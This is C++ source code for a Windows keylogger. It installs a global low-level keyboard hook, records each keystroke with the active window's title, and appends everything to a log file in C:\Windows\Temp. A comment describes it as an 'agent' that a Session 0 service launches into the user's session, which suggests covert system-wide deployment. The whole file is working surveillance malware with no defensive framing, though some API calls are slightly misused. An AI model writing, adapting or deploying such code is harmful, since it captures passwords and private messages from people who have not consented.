#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Windows 10 minimum
#endif
#define NTDDI_VERSION 0x0A000000

#define WIN32_LEAN_AND_MEAN // reduce size of the windows headers
#define NOMINMAX
#define _UNICODE
#define UNICODE
#pragma comment(lib, "User32.lib")
#include <windows.h>
#include <iostream>
#include <psapi.h> // For GetModuleBaseName
#include <string>
#include <fstream>

void LogEvent(const std::wstring &message)
{
    std::wstring logPath = L"C:\\Windows\\Temp\\winkey.log";

    std::wofstream file(logPath, std::ios::app);
    if (!file)
    {
        std::wstring buf =
            L"Failed to open log file: " + logPath +
            L", GetLastError=" + std::to_wstring(GetLastError());

        OutputDebugStringW(buf.c_str());
        return;
    }

    file << message << L'\n';
}

std::wstring GetActiveProcessName()
{
    HWND hwnd = GetForegroundWindow();

    if (hwnd == 0)
    {
        LogEvent(L"GetForegroundWindow failed\n");
        return L"Unknown";
    }
    wchar_t windowTitle[1024];
    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
    CloseHandle(hwnd);
    return (std::wstring(windowTitle));
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        std::wstring activeProcessName = GetActiveProcessName();

        wchar_t keyName[256];
        GetKeyNameText((LONG)(kbdStruct->scanCode << 16), keyName, sizeof(keyName));

        wchar_t buf[2048];
        swprintf_s(buf, L"%s : %d, %s\n", activeProcessName.c_str(), kbdStruct->vkCode, keyName);

        // TODO : use a vector but write and reset buffer if a limit is reached
        // + write a proper display
        LogEvent(buf);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// The agent (launched as Session 1 by the service in Session 0)
int main()
{
    HHOOK hKeyboardHook;
    // Hook installation
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (!hKeyboardHook)
    {
        return 1;
    }

    // Loop for the hook to work
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}